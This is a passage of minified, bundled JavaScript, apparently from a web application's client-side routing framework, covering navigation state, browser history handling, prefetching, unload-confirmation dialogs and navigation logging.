        h = a;
      }
      g.get = a;
      g.register = b;
    },
    98
  );
  __d(
    "getNonNullRouterState",
    ["unrecoverableViolation"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        if (!a)
          throw c("unrecoverableViolation")(
            "No route state before first use... did you forget to init?",
            "comet_infra",
            {},
            { categoryKey: "missing_router_state" }
          );
        return a;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "getUserIDFromRoute",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        a =
          (a == null ? void 0 : (a = a.rootView) == null ? void 0 : a.props) ||
          {};
        a = a.userID;
        return a != null && a !== "" ? a : null;
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "getTimeSpentDataFromConfig",
    [
      "ProfileCometSession",
      "Random",
      "filterObject",
      "getCometEntityKey",
      "getUserIDFromRoute",
      "mapObject",
      "recoverableViolation",
      "uuidv4",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      function i(a, b) {
        if (a == null) return null;
        switch (a.source) {
          case "passthrough_props":
            if (b != null) return b[a.name] != null ? String(b[a.name]) : null;
        }
        return null;
      }
      function j(a) {
        switch (a) {
          case "uuid":
            return c("uuidv4")();
          case "uint32":
            return d("Random").uint32().toString();
          case "upl":
            return ["upl", Date.now(), c("uuidv4")()].join("_");
          case "bigint":
            return (
              d("Random").uint32().toString() +
              d("Random").uint32().toString().slice(0, 8)
            );
          default:
            c("recoverableViolation")(
              "Invalid Time Spent SessionID type",
              "comet_infra"
            );
            return null;
        }
      }
      function a(a, b, e, f) {
        var g,
          k = a.timeSpentConfig,
          l = null;
        g = (g = c("getCometEntityKey")(a)) == null ? void 0 : g.entity_id;
        if (g != null) {
          l = babelHelpers["extends"]({}, l, { container_id: g });
          if (Boolean(k == null ? void 0 : k.has_profile_session_id)) {
            g = d("ProfileCometSession").navigate(g, e, a, f);
            g != null &&
              (l = babelHelpers["extends"]({}, l, { profile_session_id: g }));
          }
        }
        if ((k == null ? void 0 : k.session_ids) != null) {
          e = c("filterObject")(
            (h || (h = c("mapObject")))(k.session_ids, function (a) {
              var c;
              return (c = i(a.carryover, b)) != null ? c : j(a.type);
            }),
            Boolean
          );
          l = babelHelpers["extends"]({}, l, { session_ids: e });
        }
        if (Boolean(k == null ? void 0 : k.has_viewee_id)) {
          f = c("getUserIDFromRoute")(a);
          f != null && (l = babelHelpers["extends"]({}, l, { viewee_id: f }));
        }
        return l;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "handlePopComponentHistoryState",
    ["recoverableViolation"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d) {
        a === void 0 && (a = 1);
        b = (b = b == null ? void 0 : b.getCurrentRouteStep()) != null ? b : 0;
        a > b &&
          c("recoverableViolation")(
            "Component attempted to navigate back further than the current routeStep",
            "comet_infra"
          );
        b = Math.min(b, a);
        d(-b);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "handlePushComponentHistoryState",
    ["createRouteKey"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a, b, d) {
        var e = a.componentHistoryState,
          f = a.currentRouterState;
        a = a.routeUrl;
        var g = c("createRouteKey")();
        b == null ? void 0 : b.pushState([{ key: g }, null, a], !0);
        d(
          babelHelpers["extends"]({}, f, {
            componentHistoryState: e,
            routeKey: g,
          })
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "withoutKey",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function g(a) {
        a = h(a, "string");
        return typeof a === "symbol" ? a : String(a);
      }
      function h(a, b) {
        if (typeof a !== "object" || a === null) return a;
        var c =
          a[typeof Symbol === "function" ? Symbol.toPrimitive : "@@toPrimitive"];
        if (c !== void 0) {
          c = c.call(a, b || "default");
          if (typeof c !== "object") return c;
          throw new TypeError("@@toPrimitive must return a primitive value.");
        }
        return (b === "string" ? String : Number)(a);
      }
      function a(a, b) {
        a[b];
        a = babelHelpers.objectWithoutPropertiesLoose(a, [b].map(g));
        return a;
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "buildCometRouter",
    [
      "fbt",
      "Bootloader",
      "ClientConsistency",
      "CometClientConsistency",
      "CometHeroLogging",
      "CometHistoryManager",
      "CometNavigationTracing",
      "CometNavigationTracingQPLEvents",
      "CometProductAttribution",
      "CometRouterMemoryUtils",
      "CometTimeSpentNavigation",
      "CometVisitationManager",
      "ConstUriUtils",
      "CurrentUser",
      "ExecutionEnvironment",
      "FBLogger",
      "MWChatInteraction",
      "MaintainedRouteConfig",
      "ReactDOMComet",
      "absoluteToRelative",
      "buildCometErrorRoute",
      "clearTimeout",
      "cometRouterAdjustExtraConfigForRoute",
      "cometRouterBuildErrorRouteState",
      "cometRouterCleanURLSearchParameters",
      "cometRouterCreatePersistentParamsManager",
      "cometRouterIsNavigationRefresh",
      "cometRouterNavigateOnWindow",
      "cometRouterNotifyServer",
      "cometRouterPrefetchRouteQueries",
      "cometRouterPreloadEntrypoint",
      "cometRouterPreloadRouteCode",
      "cometRouterReducer",
      "cometRouterSelectNavigation",
      "cometRouterSetOriginalReferrerWithNavigationTypeAndInteraction",
      "cometRouterUnloadHookUtils",
      "cr:11053",
      "cr:1618",
      "createRouteKey",
      "currentCometRouterInstance",
      "extractTimeSpentFromCometRoute",
      "getInstanceIdentifierFromRoute",
      "getNonNullRouterState",
      "getSecondTopViewInfo",
      "getTimeSpentDataFromConfig",
      "getTopMostRoute",
      "getTopMostRouteInfo",
      "gkx",
      "goForceFullPageRedirectTo",
      "handlePopComponentHistoryState",
      "handlePushComponentHistoryState",
      "isCometRouterUrl",
      "justknobx",
      "normalizeCometRouterUrl",
      "performance",
      "performanceNow",
      "persistentQueryParams",
      "promiseDone",
      "reactStartTransition",
      "recoverableViolation",
      "removeFromArray",
      "setTimeout",
      "unrecoverableViolation",
      "uuidv4",
      "withoutKey",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j,
        k,
        l = {
          addPushView: "push",
          loadHosted: "hosted",
          loadTab: "tab",
          replacePushView: "push",
        },
        m = 2.5 * 24 * 60 * 60 * 1e3,
        n = Date.now(),
        o = 50,
        p = 500,
        q =
          ((i || (i = c("ExecutionEnvironment"))).canUseDOM
            ? (e = window) == null
              ? void 0
              : (f = e.history) == null
              ? void 0
              : (e = f.state) == null
              ? void 0
              : e.key
            : null) || "initial";
      function aa(a) {
        return (a == null ? void 0 : a.type) !== "valid_route"
          ? !0
          : !(
              (a == null ? void 0 : a.routeType) === "media_viewer" ||
              (a == null ? void 0 : a.routeType) === "creation_flow" ||
              (a == null ? void 0 : a.routeType) === "routable_dialog" ||
              ((a == null ? void 0 : a.routeType) === "messaging_thread" &&
                c("gkx")("5735"))
            );
      }
      var r = [];
      function a(a, e) {
        var f = a.defaultRoutableDialogTarget,
          g = a.disableTimeSpentLogging,
          s = a.initialActorID,
          t = a.initialBackgroundRoute,
          u = a.initialBackgroundTimeSpentMetadata,
          v = a.initialLoadTraceId,
          w = a.initialRootRoute,
          x = a.initialTimeSpentMetadata,
          y = a.navigationQPLEvent,
          z = y === void 0 ? c("CometNavigationTracingQPLEvents").navigation : y;
        y = a.persistentParameters;
        y = y === void 0 ? [] : y;
        var A = a.preloadEntrypoint,
          B = A === void 0 ? c("cometRouterPreloadEntrypoint") : A,
          C = a.relayEnvironmentFactory;
        A = a.scrollRestorationBehavior;
        var D = A === void 0 ? "manual" : A,
          E = a.uiComponents,
          F = {},
          G = {},
          H = {},
          I = c("cometRouterCreatePersistentParamsManager")(
            [].concat(c("persistentQueryParams"), y)
          ),
          J = null,
          K = {},
          L = null,
          M = null,
          N = window.location.href,
          O = null,
          P = { loading: !1 },
          Q = 0,
          R = null,
          S = null;
        function ba(a, f, g, h, k) {
          c("gkx")("708253") ||
            c("recoverableViolation")(
              "CometRouter should only be used in Comet! Using it in Blue may cause unexpected behavior.",
              "comet_infra",
              {},
              { categoryKey: "runtime_site_is_not_comet_in_router" }
            );
          if ((i || (i = c("ExecutionEnvironment"))).canUseDOM) {
            var l = "",
              m = d("ConstUriUtils").getUri(window.location.href);
            if (m != null) {
              m = c("cometRouterCleanURLSearchParameters")(m, a.stripParams);
              m != null && (I.setPersistentParams(m), (l = m.toString()));
            }
            S = d("CometHistoryManager").createHistoryManager(
              { scrollRestorationBehavior: D },
              [{ key: q }, null, l],
              Z()
            );
            b("cr:1618") == null
              ? void 0
              : b("cr:1618").registerHistoryManager(S);
            window.addEventListener(
              "beforeunload",
              d("cometRouterUnloadHookUtils").createOnBeforeUnloadEventHandler(T)
            );
            c("promiseDone")(
              e
                .fetchRoute(a.url, E == null ? void 0 : E.ErrorRoot)
                .then(function (a) {
                  a.onNavigationCallback && a.onNavigationCallback(a);
                })
            );
          }
          m =
            typeof (j || (j = c("performance"))).getEntriesByType === "function"
              ? (j || (j = c("performance"))).getEntriesByType("navigation")[0]
              : null;
          m =
            (m == null ? void 0 : m.type) === "reload" ||
            ((l = (j || (j = c("performance"))).navigation) == null
              ? void 0
              : l.type) === "reload"
              ? "reload"
              : "initial";
          l =
            a.tabKey != null &&
            ((l = c("MaintainedRouteConfig")[a.tabKey]) == null
              ? void 0
              : l.maintained);
          var n = h != null ? h : a;
          a = h != null ? a : null;
          k = h != null ? k : g;
          h = h != null ? g : null;
          g = c("CometHeroLogging").genHeroInteractionUUIDAndMarkStart(f);
          f = {
            main: {
              mainScrollKey: l ? Date.now() : null,
              mutableState: {},
              navigationInteractionID: g,
              productAttribution: d(
                "CometProductAttribution"
              ).getProductAttributionFromRoute(n, "via_cold_start"),
              referrer: {
                isBackgroundRoute: a != null,
                navigationType: m,
                url: (i || (i = c("ExecutionEnvironment"))).canUseDOM
                  ? document.referrer
                  : null,
              },
              route: n,
              timeSpentMetaData: k,
            },
            routeKey: (i || (i = c("ExecutionEnvironment"))).canUseDOM
              ? q
              : "initial_ssr",
          };
          a != null &&
            (f = babelHelpers["extends"]({}, f, {
              pushViewStack: [
                {
                  depth: 1,
                  key: "pushView-key-" + Date.now(),
                  mutableState: {},
                  navigationInteractionID: g,
                  productAttribution: d(
                    "CometProductAttribution"
                  ).getProductAttributionFromRoute(a, "via_cold_start"),
                  referrer: { navigationType: m },
                  refreshKey: null,
                  route: a,
                  timeSpentMetaData: h,
                },
              ],
            }));
          V(f);
          b("cr:1618") == null ? void 0 : b("cr:1618").setAllMaps(F, H);
        }
        function T() {
          return c("getNonNullRouterState")(J);
        }
        var U = {};
        function V(a) {
          var d;
          d = (i || (i = c("ExecutionEnvironment"))).canUseDOM
            ? (d = S) == null
              ? void 0
              : d.getState()
            : null;
          d = (d == null ? void 0 : d.key) || q;
          F[d] = a;
          var e = J;
          J = a;
          L = d;
          var f = e == null ? void 0 : e.main.route.tabKey;
          a = J.main.route.tabKey;
          if (a !== f) {
            a != null &&
              K[a] &&
              ((K = c("withoutKey")(K, a)),
              b("cr:1618") == null
                ? void 0
                : b("cr:1618").updateAndInformMaintainedTabs(K, "end", a),
              U[a] && (c("clearTimeout")(U[a]), delete U[a]));
            if (f != null && e != null) {
              var g = c("MaintainedRouteConfig")[f];
              if (
                (g == null ? void 0 : g.maintained) &&
                !K[f] &&
                c("CometRouterMemoryUtils").hasNoMemoryConcern(f)
              ) {
                var h;
                K = babelHelpers["extends"](
                  {},
                  K,
                  ((h = {}), (h[f] = e.main), h)
                );
                b("cr:1618") == null
                  ? void 0
                  : b("cr:1618").updateAndInformMaintainedTabs(K, "start", f);
                g.maintainRouteForMs != null &&
                  (U[f] = c("setTimeout")(function () {
                    delete U[f],
                      (K = c("withoutKey")(K, f)),
                      b("cr:1618") == null
                        ? void 0
                        : b("cr:1618").updateAndInformMaintainedTabs(K, "end", f),
                      Y();
                  }, g.maintainRouteForMs));
              }
            }
          }
          b("cr:1618") == null
            ? void 0
            : b("cr:1618").setTabKeyToRouteKeyMap(a, d);
          b("cr:1618") == null ? void 0 : b("cr:1618").updateInfo(d);
        }
        var W = [],
          X = null,
          ca = !1;
        function Y() {
          W.forEach(function (a) {
            return a();
          });
        }
        function Z() {
          return (i || (i = c("ExecutionEnvironment"))).canUseDOM ? ea : null;
        }
        function da() {
          var a = T(),
            b = a.hosted;
          a = a.pushViewStack;
          return a != null && a.length > 0
            ? "pushView"
            : b != null
            ? "hostedView"
            : "rootView";
        }
        function ea() {
          var a;
          R = null;
          a = (i || (i = c("ExecutionEnvironment"))).canUseDOM
            ? (a = S) == null
              ? void 0
              : a.getState()
            : null;
          var b = a == null ? void 0 : a.key;
          if (b == null || !F[b]) {
            $.withContext({ from: da() }).go(
              window.location.pathname +
                window.location.search +
                window.location.hash,
              {
                navigationType: "popstate",
                replace: !0,
                target: c("justknobx")._("356") ? null : "self",
              }
            );
            return;
          }
          a = F[b];
          var f = c(
            "cometRouterSetOriginalReferrerWithNavigationTypeAndInteraction"
          )(c("getTopMostRoute")(T()), a, "popstate");
          if (G[b]) {
            var g = G[b];
            f = babelHelpers["extends"]({}, f, { focusReturnRef: g });
          }
          var h = c("getTopMostRoute")(f),
            j = c("getTopMostRouteInfo")(f);
          if (
            J != null &&
            (J.componentHistoryState != null ||
              f.componentHistoryState != null) &&
            window.location.href === N
          ) {
            V(f);
            Y();
            return;
          }
          g = function () {
            d("ReactDOMComet").flushSync(function () {
              var a;
              d("CometNavigationTracing").traceNavigation(
                h.url,
                h,
                (k || (k = c("performanceNow")))(),
                function (a) {
                  h.tabKey != null &&
                    K[h.tabKey] &&
                    a.addMetadata("maintained", "true");
                  J &&
                    J.pushViewStack &&
                    (f.pushViewStack == null ||
                      J.pushViewStack.length > f.pushViewStack.length) &&
                    a.addMetadata("closed_push_view", 1);
                  var d = c("getInstanceIdentifierFromRoute")(h);
                  d != null && a.setInstanceIdentifier(d);
                  (d = f.main.entryPointContainer) == null
                    ? void 0
                    : d.loadIfNeeded();
                  (d = f.hosted) == null
                    ? void 0
                    : (d = d.entryPointContainer) == null
                    ? void 0
                    : d.loadIfNeeded();
                  (d = f.pushViewStack) == null
                    ? void 0
                    : d.forEach(function (a) {
                        return a == null
                          ? void 0
                          : (a = a.entryPointContainer) == null
                          ? void 0
                          : a.loadIfNeeded();
                      });
                  a.addMetadata("navigation_event", "onPopState");
                  a.addMetadata("navigation_source", "popState");
                  ha(f, null, a);
                  if (b !== q && j.skipNotifyServer !== !0) {
                    a =
                      j == null
                        ? void 0
                        : (d = j.referrer) == null
                        ? void 0
                        : d.actorID;
                    c("cometRouterNotifyServer")(
                      h.url,
                      h,
                      a,
                      function () {
                        return b !== L;
                      },
                      function (a) {
                        $.withContext({ from: da() }).go(a.url, {
                          navigationType: "popstate",
                          replace: !0,
                          target: "self",
                        });
                      },
                      e,
                      E == null ? void 0 : E.ErrorRoot
                    );
                  }
                },
                (a = f.main.navigationInteractionID) != null ? a : void 0,
                z
              );
            });
          };
          if (L != null) {
            a = d("cometRouterUnloadHookUtils").runUnloadHooks(T(), a);
            if (a != null && X != null) {
              var l = function () {
                var a;
                (a = S) == null
                  ? void 0
                  : a.pushState(
                      [{ key: (a = L) != null ? a : " No route key" }, null, M],
                      !1
                    );
              };
              return pa(a, l, g);
            }
          }
          g();
        }
        function fa(a) {
          var b =
            P.loading && !P.canceledRef.canceled
              ? P.canceledRef
              : { canceled: !1 };
          P = {
            cancel: function () {
              b.canceled = !0;
            },
            canceledRef: b,
            loading: !0,
            nextState: a,
          };
          Y();
          return b;
        }
        function ga() {
          P = { loading: !1 };
        }
        function ha(a, e, f) {
          d("ReactDOMComet").flushSync(function () {
            fa(a);
          });
          function h() {
            O && (O.cancel(), (O = null));
            ga();
            V(a);
            Y();
            e && e(!0);
            f.addMarkerPoint(
              "RouterState_Updated",
              "VisualCompletion",
              (k || (k = c("performanceNow")))()
            );
            if (g !== !0) {
              d("CometVisitationManager").updateFromRouterState(a);
              var h = c("getTopMostRoute")(a),
                i = c("getTopMostRouteInfo")(a);
              c("CometTimeSpentNavigation").changePath(
                c("extractTimeSpentFromCometRoute")(h),
                i.productAttribution,
                i.timeSpentMetaData
              );
              b("cr:11053") != null && b("cr:11053").logNavigation(h);
            }
          }
          c("reactStartTransition")(h, { name: f.getTraceId() });
        }
        var ia = function (a) {
            return function (b, c, d) {
              d === void 0 && (d = { replace: !1 });
              return na(b, c, d, a);
            };
          },
          ja = function (a) {
            return function (b) {
              var c = b.actorID,
                d = b.from,
                e = b.tracePolicy;
              b = b.url;
              var f = babelHelpers["extends"]({}, a);
              c !== void 0 && (f.actorID = c);
              d !== void 0 && (f.from = d);
              e !== void 0 && (f.tracePolicy = e);
              b !== void 0 && (f.url = b);
              return ma(babelHelpers["extends"]({}, a, f));
            };
          },
          ka = function (a) {
            return function (b, d) {
              return c("cometRouterPreloadRouteCode")(
                b,
                d,
                a,
                T(),
                e,
                E == null ? void 0 : E.ErrorRoot
              );
            };
          },
          la = function (a) {
            return function (b, d, f) {
              d === void 0 && (d = { navigationType: "navigation", replace: !1 });
              O = c("cometRouterPrefetchRouteQueries")(
                b,
                d,
                f,
                a,
                T,
                K,
                e,
                B,
                C,
                E == null ? void 0 : E.ErrorRoot
              );
              return O;
            };
          },
          ma = function (a) {
            if (a === void 0) {
              var b;
              a = {
                actorID: (b = s) != null ? b : c("CurrentUser").getID(),
                from: "rootView",
              };
            }
            var d = ia(a);
            return {
              componentHistoryState: { popState: ra, pushState: sa },
              go: function (a, b) {
                return d(a, null, b);
              },
              goBack: ua,
              goTo: function (a, b) {
                return d(a.url, a, b);
              },
              popPushView: va,
              prefetchRouteDefinition: function (a) {
                a = c("normalizeCometRouterUrl")(a);
                void e.fetchRoute(a, E == null ? void 0 : E.ErrorRoot);
              },
              prefetchRouteQueries: la(a),
              preloadRouteCode: ka(a),
              withContext: ja(a),
            };
          },
          $ = ma();
        b("cr:1618") == null ? void 0 : b("cr:1618").registerDispatcher($);
        function na(a, b, e, f) {
          e === void 0 && (e = { replace: !1 });
          var g = c("normalizeCometRouterUrl")(a);
          d("CometNavigationTracing").traceNavigation(
            g,
            b,
            e.eventTimestamp,
            function (a) {
              oa(g, b, e, f, a);
            },
            void 0,
            z
          );
        }
        function oa(a, g, h, i, j) {
          var k = d("ConstUriUtils").getUri(a);
          k != null &&
            k.getPath() === "/undefined" &&
            c("recoverableViolation")(
              "/undefined was passed a url to the Comet Router. Please make sure you're building a URL using RouteBuilders",
              "comet_infra"
            );
          if (!c("isCometRouterUrl")(a)) {
            c("recoverableViolation")(
              "Cannot use Comet Router to navigate to a non-router URL",
              "comet_infra",
              {},
              { categoryKey: "non_comet_route_url", trackOnly: !0 }
            );
            return;
          }
          if (ca) return;
          var p = babelHelpers["extends"]({}, T(), { focusReturnRef: null });
          g = (k = g) != null ? k : e.getRoute(a);
          k = Date.now() - n > m;
          var q = Q >= o,
            r = null,
            s = aa(g);
          c("ClientConsistency").getPendingRefresh() != null && s
            ? ((r = c("ClientConsistency").getPendingRefresh()),
              c("CometClientConsistency").logRefreshOnNav())
            : q
            ? (r = "navigation_limit")
            : k
            ? (r = "session_time_limit")
            : s &&
              c("CometRouterMemoryUtils").shouldRefreshDueToMemoryConcern(
                p.main.route,
                g
              ) &&
              (r = "memory_limit");
          if (r != null)
            return c("cometRouterNavigateOnWindow")(
              I.getUrlWithPersistentParams(a),
              r,
              h.replace
            );
          q = h;
          P.loading &&
            (P.cancel(), (q = babelHelpers["extends"]({}, q, { replace: !0 })));
          q = c("cometRouterAdjustExtraConfigForRoute")(a, i, q, T());
          k = q;
          var t = k.dispatchedFrom,
            u = k.force;
          s = k.linkRef;
          var v = k.navigationType,
            w = k.onNavigate,
            x = k.passthroughProps,
            y = k.previousActorID,
            z = k.productAttributionUpdateProps;
          r = k.replace;
          var A = r === void 0 ? !1 : r;
          h = k.skipNotifyServer;
          var D = h === void 0 ? !1 : h,
            H = k.target,
            J = k.traceParams,
            O = c("createRouteKey")(),
            R = { key: O };
          function ba(a, b) {
            a = I.getUrlWithPersistentParams(a);
            var e = "",
              f = d("ConstUriUtils").getUri(a);
            if (f != null) {
              f = c("cometRouterCleanURLSearchParameters")(f, b);
              e = f != null ? f.toString() : "";
            }
            if (A) {
              (b = S) == null ? void 0 : b.replaceState([R, null, e], !1);
            } else {
              (f = S) == null ? void 0 : f.pushState([R, null, e], !1);
            }
            M = a;
            N = window.location.href;
          }
          s != null && L != null && (G[L] = s);
          F[O] = p;
          b("cr:1618") == null ? void 0 : b("cr:1618").fetchErrorStack(O);
          if ((g == null ? void 0 : g.type) === "valid_route") Z(g, a), D || V(g);
          else {
            j.addMetadata("unfetched_rd", 1);
            var U = fa();
            c("promiseDone")(
              e.fetchForNavigation(
                a,
                y,
                (q = c("getTopMostRoute")(p)) == null ? void 0 : q.tracePolicy,
                E == null ? void 0 : E.ErrorRoot
              ),
              function (b) {
                var d = b.route;
                !U.canceled
                  ? d.type !== "valid_route"
                    ? (c("cometRouterNavigateOnWindow")(d.url, "unmatched", A),
                      w && w(!0))
                    : (Z(
                        d,
                        a,
                        !1,
                        b.initialTimeSpentMetaData,
                        b.backgroundInitialTimeSpentMetaData
                      ),
                      V(d))
                  : w && w(!1);
              },
              function (b) {
                !U.canceled
                  ? Z(
                      c("buildCometErrorRoute")(
                        a,
                        E == null ? void 0 : E.ErrorRoot
                      ),
                      a
                    )
                  : w && w(!1),
                  c("FBLogger")("CometRouter")
                    .catching(b)
                    .mustfix(
                      "An error occured fetching a comet route for url: %s",
                      a
                    );
              }
            );
          }
          function V(b) {
            c("cometRouterNotifyServer")(
              a,
              b,
              y,
              function () {
                return O !== L;
              },
              function (b) {
                return Z(b, a, !0);
              },
              e,
              E == null ? void 0 : E.ErrorRoot
            );
          }
          function W(a, b, e) {
            if (a != null) {
              b = d("ConstUriUtils").getUri(b.url);
              b = b && b.setSecure(!0);
              b = b && b.setDomain(a.getDomain());
              a = b && b.setSubDomain(e);
              a != null && c("goForceFullPageRedirectTo")(a.toString());
            }
          }
          function Y(a) {
            var b,
              c = d("ConstUriUtils").getUri(window.location.href);
            b = (b = c && c.getSubdomain()) != null ? b : "";
            a.useSecureSubdomain === !0 && b !== "secure"
              ? W(c, a, "secure")
              : a.useSecureSubdomain !== !0 && b === "secure" && W(c, a, "www");
          }
          function Z(a, b, g, h, k) {
            var m;
            g === void 0 && (g = !1);
            Y(a);
            var n = c("getInstanceIdentifierFromRoute")(a);
            n != null && j.setInstanceIdentifier(n);
            j.setTracePolicy(a.tracePolicy);
            n = c("cometRouterSelectNavigation")(a, H, t, T(), e, f);
            var o = n.target,
              q = o.route;
            o = o.view;
            m = (m = n.modal) != null ? m : {};
            var r = m.route;
            m = m.view;
            var s = k != null ? k : h;
            k = k != null ? h : null;
            s =
              (h = s) != null
                ? h
                : c("getTimeSpentDataFromConfig")(
                    q,
                    x,
                    c("getTopMostRoute")(T()),
                    v
                  );
            k =
              r != null
                ? (h = k) != null
                  ? h
                  : c("getTimeSpentDataFromConfig")(
                      r,
                      x,
                      c("getTopMostRoute")(T()),
                      v
                    )
                : null;
            if (o) {
              B(q, o, s, x, y, C, K);
              r != null && m != null && B(r, m, k, x, y, C, K);
              ((h = o.allResources) != null ? h : [])
                .concat(
                  (o = m == null ? void 0 : m.allResources) != null ? o : []
                )
                .forEach(function (a) {
                  return a.preload();
                });
              c("Bootloader").forceFlush();
            }
            m = c("cometRouterIsNavigationRefresh")((h = r) != null ? h : q, T());
            m && j.addMetadata("refresh", 1);
            o = q.tabKey;
            o != null && K[o] != null && j.addMetadata("maintained", "true");
            h = null;
            if (n.action === "loadTab" && o != null) {
              K[o] != null
                ? (h = K[o].mainScrollKey)
                : p.main.route.tabKey === o && p.main.mainScrollKey != null
                ? (h = p.main.mainScrollKey)
                : ((o = c("MaintainedRouteConfig")[o]) == null
                    ? void 0
                    : o.maintained) && (h = Date.now());
            }
            q.params.thread_key != null &&
              d("MWChatInteraction").set(
                String(q.params.thread_key),
                j.getTraceId()
              );
            q.params.folder_id != null &&
              q.params.thread_key == null &&
              j.addMetadata("is_community", !0);
            o = {
              mainScrollKey: h,
              navigationInteractionID: c(
                "CometHeroLogging"
              ).genHeroInteractionUUIDAndMarkStart(j.getTraceId()),
              passthroughProps: x,
              referrer: {
                actorID: i.actorID,
                isBackgroundRoute: r != null,
                navigationType: (o = v) != null ? o : "navigation",
                tracePolicy: (h = i.tracePolicy) != null ? h : "comet.app",
                url: i.url,
              },
              refreshKey: m ? "" + Date.now() : null,
              skipNotifyServer: D,
              timeSpentMetaData: s,
            };
            h =
              r != null
                ? babelHelpers["extends"]({}, o, {
                    mainScrollKey: null,
                    timeSpentMetaData: k,
                  })
                : null;
            var F,
              G =
                a.canonicalUrl != null && a.canonicalUrl !== ""
                  ? a.canonicalUrl
                  : (m = a.url) != null
                  ? m
                  : b;
            try {
              F = c("cometRouterReducer")(O, p, {
                __type: n.action,
                payload: {
                  dispatchedFrom: t,
                  productAttributionUpdateProps: z,
                  routeInfoExtras: o,
                  to: q,
                  wasHistoryReplaced: A || g,
                },
              });
              if (r != null && h != null) {
                s =
                  n.action === "loadTab"
                    ? "rootView"
                    : n.action === "loadHosted"
                    ? "hostedView"
                    : "pushView";
                F = c("cometRouterReducer")(O, F, {
                  __type: "addPushView",
                  payload: {
                    dispatchedFrom: s,
                    productAttributionUpdateProps: z,
                    routeInfoExtras: h,
                    to: r,
                    wasHistoryReplaced: !1,
                  },
                });
              }
            } catch (a) {
              c("FBLogger")("CometRouter")
                .catching(a)
                .mustfix(
                  "Error determining router state, redirecting to Comet Error page"
                );
              F = c("cometRouterBuildErrorRouteState")(
                p,
                O,
                G,
                (k = h) != null ? k : o,
                t,
                E == null ? void 0 : E.ErrorRoot
              );
            }
            m = l[n.action];
            j.addMetadata("view_type", m);
            if (m === "hosted") {
              j.addMetadata(
                "host_route",
                (b = F.main.route.tracePolicy) != null ? b : ""
              );
            }
            n.action === "addPushView" &&
              F.pushViewStack != null &&
              j.addMetadata("push_view_count", F.pushViewStack.length);
            for (q in J) j.addMetadata(q, J[q]);
            g = function () {
              H !== "self" &&
                aa(a) &&
                (Q++, c("CometRouterMemoryUtils").logNavigationCount(Q)),
                ba(G, a.stripParams),
                ha(F, w, j);
            };
            s = d("cometRouterUnloadHookUtils").runUnloadHooks(T(), F, u);
            if (u !== !0 && s != null && X != null) {
              r = function () {
                w && w(!1);
              };
              j.addMetadata("onbeforeunload_dialog_triggered", 1);
              return pa(s, r, g);
            }
            g();
          }
        }
        function pa(a, b, d) {
          if (X == null) {
            c("FBLogger")("comet_infra").warn(
              "No onBeforeUnload Listener but ran onBeforeUnload hooks"
            );
            return;
          }
          ca = !0;
          P.loading && (ga(), Y());
          var e = !1,
            f = function (a) {
              return function () {
                a(), (e = !0), (ca = !1);
              };
            },
            g = f(b),
            i = f(d);
          f = function (a, b) {
            return function () {
              a(g, i);
              if (!e) {
                b();
                throw c("unrecoverableViolation")(
                  "onBeforeUnload configuration has an action that does NOT call either stayOnThisPage or leaveThisPage",
                  "comet_infra"
                );
              }
            };
          };
          var j = a.bodyText,
            k = a.onClose,
            l = a.primaryAction,
            m = a.primaryButtonLabel,
            n = a.secondaryAction,
            o = a.secondaryButtonLabel,
            p = a.title;
          a = a.warnMessage;
          n = n != null ? f(n, b) : g;
          return X(
            (m = m) != null ? m : h._("__JHASH__fFtSbZ_8XIe__JHASH__"),
            l != null ? f(l, d) : i,
            (m = o) != null ? m : h._("__JHASH__F9RZzGvnDZU__JHASH__"),
            n,
            (l = p) != null ? l : h._("__JHASH__hEexArbfHxf__JHASH__"),
            (d = j) != null ? d : a,
            k != null ? f(k, b) : n
          );
        }
        function qa(a) {
          window.requestAnimationFrame(function () {
            window.requestAnimationFrame(function () {
              if (R !== null && R === a) {
                var b = T(),
                  d = b.hosted,
                  e = b.main;
                b = b.pushViewStack;
                var f = null;
                b != null && b.length > 1
                  ? (f = b[b.length - 2].route.url)
                  : d != null
                  ? (f = d.route.url)
                  : (f = e.route.url);
                c("cometRouterNavigateOnWindow")(f, "history_back_failed");
              }
            });
          });
        }
        function ra(a) {
          a === void 0 && (a = 1);
          return c("handlePopComponentHistoryState")(a, S, ta);
        }
        function sa(a) {
          return c("handlePushComponentHistoryState")(
            { componentHistoryState: a, currentRouterState: T(), routeUrl: M },
            S,
            function (a) {
              V(a), Y();
            }
          );
        }
        function ta(a) {
          if (a < 0) {
            var b;
            R = c("uuidv4")();
            (b = S) == null ? void 0 : b.go(a);
            b = qa.bind(null, R);
            c("setTimeout")(b, p);
          } else {
            (b = S) == null ? void 0 : b.go(a);
          }
        }
        function ua() {
          ta(-1);
        }
        function va() {
          var a = T(),
            b = a.pushViewStack;
          if (b == null || b.length === 0) return;
          b = b[b.length - 1];
          if (b.route.routeType === "routable_dialog") {
            var d;
            a = (a = c("getSecondTopViewInfo")(a)) == null ? void 0 : a.routeInfo;
            if (
              a != null &&
              ((d = a.referrer) == null ? void 0 : d.isBackgroundRoute) === !0
            ) {
              $.goTo(a.route, { navigationType: "navigation", replace: !1 });
              return;
            }
          }
          d =
            (a = (d = S) == null ? void 0 : d.getCurrentRouteStep()) != null
              ? a
              : 0;
          a = b.depth + d;
          ta(-a);
        }
        function wa(a) {
          W.push(a);
          return {
            cancel: function () {
              return c("removeFromArray")(W, a);
            },
          };
        }
        function xa(a) {
          X = a;
          return {
            cancel: function () {
              X === a && (X = null);
            },
          };
        }
        A = {
          dispatcher: $,
          getCurrentRouterState: T,
          getLoadingState: function () {
            return P;
          },
          getMaintainedRouteState: function () {
            return K;
          },
          listen: wa,
          setUnloadListener: xa,
          store: e,
        };
        a = N != null && N !== "" ? c("absoluteToRelative")(N) : w.url;
        y = babelHelpers["extends"]({}, w, { url: a });
        ba(y, v, x, t, u);
        r.length === 0 && d("currentCometRouterInstance").register(A);
